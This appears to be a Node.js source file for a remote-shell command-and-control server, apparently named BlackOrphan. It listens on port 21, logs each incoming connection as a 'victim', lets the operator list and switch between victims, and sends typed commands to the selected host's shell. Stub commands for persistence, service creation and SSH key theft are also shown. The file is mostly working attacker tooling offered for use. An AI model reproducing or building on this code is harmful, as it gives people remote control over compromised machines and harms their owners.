#!/usr/bin/env node
'use strict';

const net = require('net');

const util = require('util');
const color = require('colors/safe');
const exec = require('child_process').exec;

//const BlackOrphanWrite = require('console').Console;
//const setVictims = require('./misc/initvictims.js');
//const handleInput = require('./misc/handleinput.js');
//const {searchUser,showAllUsers} = require('./misc/victimtrasverse.js');
// no need to use rdinterface.write, it fucks up the prompt
//const bo = new BlackOrphanWrite(process.stdout);

let currentClient;



let serverList = {};

let prompt = {
    prompt() {
	process.stdout.write(color.bgBlack(color.grey(color.green(`${this.id}_${this.address}:${this.port}`) + ' > ')));
    },
    setPrompt(sockParams) {
	Object.assign(this, sockParams);
    }
};


let i = 0;
function initVictim(socket) {
    
    let _id = (++i) + "_" + socket.remotePort;

    // each socket object is unique
    serverList[_id] = {
	id: _id,
	sock: socket,
	address: socket.remoteAddress,
	port: socket.remotePort,
	localPort: socket.localPort,
	localAddress: socket.localAddress
    };
    
    return { serverList };
}




const tcpServer = net.createServer((socket) => {
    
    let socketList;
    let sock;
    let {localAddress,localPort,remoteAddress,remotePort} = socket;
    console.log(`\nsending new connection from ${localAddress}:${localPort} to ${remoteAddress}:${remotePort}`);
    
    socketList = initVictim(socket).serverList;

    if ( ! currentClient ) {
	currentClient = socketList[Object.getOwnPropertyNames(socketList)[0]];
	let {id,port,address} = currentClient;
	prompt.setPrompt({id,port,address});
    }

    prompt.prompt();
    
    process.stdin.setEncoding('utf-8');
    
    process.stdin.on('readable', (  ) => {

	let data = process.stdin.read();

	if ( data === null )  return ;

	let cmd =  /([a-z]+)?/.exec(data)[1];

	switch (cmd) {
	    
	case "switch":
	    let getUserToSwitch = data.split(" ")[1].trim();
	    
	    if ( getUserToSwitch && Number.isInteger(Number(getUserToSwitch))) {
		// building regexp to match request victim 
		let userRegexp = new RegExp(`^(${getUserToSwitch}){1,}`);

		currentClient = Object.keys(socketList).filter(( l ) => (userRegexp.test(l)) );

		currentClient = socketList[currentClient];
		
		if ( ! currentClient ) {
		    process.stdout.write(color.red("There is no user with the id of " +  getUserToSwitch));
		    prompt.prompt();
		    return ;
		}
		
		let { id, address, port } = currentClient;
		
		prompt.setPrompt({id,port,address});
		prompt.prompt();
		
	    }
	    break;
	    
	case 'list':
	    
	    let objNames = Object.getOwnPropertyNames(socketList);
	    
	    let i = 0;

	    
	    objNames.forEach((sockets) => {
		let {id, port, address, localPort, localAddress} = socketList[sockets];
		process.stdout.write(`${(++i)} ${localAddress}:${localPort} --> ${address}:${port}\n`);

	    });
	    prompt.prompt();
	    break;
	case 'persistent':
	    
	    sock = currentClient["sock"];
	    
	    

	    
	    break;
	case 'create_service':
	    sock = currentClient["sock"];
	    break;
	case 'get_ssh':
	    sock = currentClient["sock"];
	    break;
	case 'put_ssh':
	    sock = currentClient["sock"];
	    break;
	case 'open_ssh_session':
	    sock = currentClient["sock"];
	    break;
	case 'kill_client':
	    sock = currentClient["sock"];
	default:
	    sock = currentClient["sock"];
	    

	    sock.write(data)
	    
	    sock.on('data', ( data ) => {
		process.stdout.write(data);
		prompt.prompt();
	    });

	    sock.on('error', (err) => {
		proces.stderr.write(err)
		prompt.prompt();
	    });

	    // remove socket from here
	    sock.on('end', () => {
		
		
	    });
	}
	
    });

    
});

tcpServer.listen(21, () => {
    console.log('listening for connection on port 21');
});
